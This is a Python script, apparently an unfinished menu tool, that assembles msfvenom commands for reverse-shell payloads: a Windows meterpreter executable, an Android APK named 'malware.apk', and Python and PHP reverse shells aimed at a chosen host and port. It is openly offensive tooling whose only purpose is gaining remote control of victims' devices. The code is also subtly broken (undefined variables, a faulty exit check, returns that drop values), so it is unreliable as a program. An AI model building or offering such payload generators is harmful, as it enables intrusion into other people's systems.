import socket    
import netifaces
import os
import sys
from requests import get
                                                                                              
def menutop():
    print(sep)
    print(f"Hostname:                        {hostname}")
    print(f"Local IP Address:                {localip}")
    print(f"External IP Address:             {externalip}")
    print(f"Gateway:                         {gatewayip}")
    print(sep)

def plat_sel():
    menutop()
    print("1 - Windows")
    print("2 - Android")
    print("3 - Python")
    print("4 - PHP")
    print("5 - Exit")
    print(sep)
    option0 = input(">> ")

    if option0 == "1":
        #Windows
        os.system("clear")
        print("Windows platform selected")
        platform0 = "msfvenom -p windows/x64/meterpreter/reverse_tcp"
        out_file = "-f exe -o reverse.exe"
        net_sel()
        return platform0 and out_file

    elif option0 == "2":
        #Android
        os.system("clear")
        print("Android platform selected")
        platform0 = "msfvenom --platform android -p android/meterpreter/reverse_tcp" 
        out_file = "R -o malware.apk"
        net_sel()
        return platform0 and out_file

    elif option0 == "3":
        #Python
        os.system("clear")
        print("Python venom selected")
        platform0 = "msfvenom -p cmd/unix/reverse_python"     
        out_file = "-f raw -o shell.py" 
        net_sel()
        return platform0 and out_file

    elif option0 == "4":
        #PHP
        os.system("clear")
        print("PHP venom selected")
        platform0 = "msfvenom -p php/reverse_php "
        out_file = "-o shell.php"
        net_sel()
        return platform0 and out_file

    elif option0 == str("exit" or "5" or "q"):
        os.system("clear")
        print("byeeeeee")
        sys.exit()

def net_sel():
    menutop()
    print("Write down your Host")
    print(f"Default IP [{localip}] ")
    print(sep)
    option2 = input(">> ")
    if len(option2) == 0:
        address0 == localip
        port_sel()
        return address0

    elif option2 == str():
        option2 = address0
        port_sel()
        return address0

def port_sel():
    menutop()
    print("Which por are you going to use ???")
    print("(Default Port: 4444)")
    print(sep)
    option3 = input(">> ")
    if len(option3) == 0:
        port0 = 4444
        return port0
    elif option3 == str() or float():
        option3 = port0
        return port0
    
def scriptgen(platform0, address0, port0, out_file):
    script = platform0 + address0 + port0 + out_file
    print(script)


def listenergen():
    print("Would you like to generate the listener ??? (y or n)")
    option4 = input(">> ")
    print(sep)
    if option4 == "y":
        print("")
    elif option4 == "n":
        print("")

#Variables
sep = "---------------------------------------------------"
hostname = socket.gethostname()
localip = socket.gethostbyname(hostname)
externalip = get('https://api.ipify.org').content.decode('utf8')
gatewayip = netifaces.gateways()['default'][netifaces.AF_INET][0]

#Exec

os.system("clear")


plat_sel()